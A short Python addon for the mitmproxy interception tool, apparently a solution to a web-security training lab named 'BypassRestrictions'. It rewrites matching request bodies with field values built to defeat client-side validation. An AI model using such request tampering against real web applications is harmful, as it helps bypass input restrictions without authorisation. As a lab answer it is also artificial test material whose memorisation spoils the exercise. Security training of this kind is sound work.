from mitmproxy import http
from mitmproxy import ctx

def request(flow: http.HTTPFlow) -> None:
  if 'BypassRestrictions' in flow.request.url:
    flow.request.content = (
      b'error=0'
      b'&field1=UPPERCASE'
      b'&field2=NOTDIGIT'
      b'&field3=____underscore'
      b'&field4=nondigitword'
      b'&field5=nonzipcode'
      b'&field6=nonzipcode'
      b'&field7=99999999999999999999999'
    )
